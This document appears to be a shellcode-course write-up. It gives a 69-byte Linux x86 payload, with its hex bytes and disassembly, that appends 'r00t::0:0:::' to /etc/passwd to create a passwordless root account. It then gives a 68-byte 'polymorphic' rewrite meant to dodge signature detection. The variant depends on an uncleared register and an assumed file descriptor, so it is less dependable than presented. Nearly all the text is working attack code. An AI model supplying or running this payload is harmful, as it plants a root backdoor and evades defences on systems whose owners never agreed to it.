## Initial nasm code

Original shellcode: [Link](http://shell-storm.org/shellcode/files/shellcode-211.php)

Length: 69 bytes

Obtain from running: 

    echo -ne "\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x89\xc3\x6a\x04\x58\x31\xd2\x52\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68\x72\x30\x30\x74\x89\xe1\x6a\x0c\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
    
    00000000  6A05              push byte +0x5
    00000002  58                pop eax
    00000003  31C9              xor ecx,ecx
    00000005  51                push ecx
    00000006  6873737764        push dword 0x64777373
    0000000B  682F2F7061        push dword 0x61702f2f
    00000010  682F657463        push dword 0x6374652f
    00000015  89E3              mov ebx,esp
    00000017  66B90104          mov cx,0x401
    0000001B  CD80              int 0x80
    0000001D  89C3              mov ebx,eax
    0000001F  6A04              push byte +0x4
    00000021  58                pop eax
    00000022  31D2              xor edx,edx
    00000024  52                push edx
    00000025  68303A3A3A        push dword 0x3a3a3a30
    0000002A  683A3A303A        push dword 0x3a303a3a
    0000002F  6872303074        push dword 0x74303072
    00000034  89E1              mov ecx,esp
    00000036  6A0C              push byte +0xc
    00000038  5A                pop edx
    00000039  CD80              int 0x80
    0000003B  6A06              push byte +0x6
    0000003D  58                pop eax
    0000003E  CD80              int 0x80
    00000040  6A01              push byte +0x1
    00000042  58                pop eax
    00000043  CD80              int 0x80
    
  
 ## Polymorphic nasm code

Length: 68 bytes

Obtain from running: 

    echo -ne "\x6a\x05\x58\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x6a\x03\x5b\x83\xc0\x01\x50\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68\x72\x30\x30\x74\x89\xe1\x6a\x0c\x5a\xcd\x80\x83\xc3\x03\x89\xd8\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
    
    00000000  6A05              push byte +0x5
    00000002  58                pop eax
    00000003  51                push ecx
    00000004  6873737764        push dword 0x64777373
    00000009  682F2F7061        push dword 0x61702f2f
    0000000E  682F657463        push dword 0x6374652f
    00000013  89E3              mov ebx,esp
    00000015  66B90104          mov cx,0x401
    00000019  CD80              int 0x80
    0000001B  6A03              push byte +0x3
    0000001D  5B                pop ebx
    0000001E  83C001            add eax,byte +0x1
    00000021  50                push eax
    00000022  68303A3A3A        push dword 0x3a3a3a30
    00000027  683A3A303A        push dword 0x3a303a3a
    0000002C  6872303074        push dword 0x74303072
    00000031  89E1              mov ecx,esp
    00000033  6A0C              push byte +0xc
    00000035  5A                pop edx
    00000036  CD80              int 0x80
    00000038  83C303            add ebx,byte +0x3
    0000003B  89D8              mov eax,ebx
    0000003D  CD80              int 0x80
    0000003F  6A01              push byte +0x1
    00000041  58                pop eax
    00000042  CD80              int 0x80
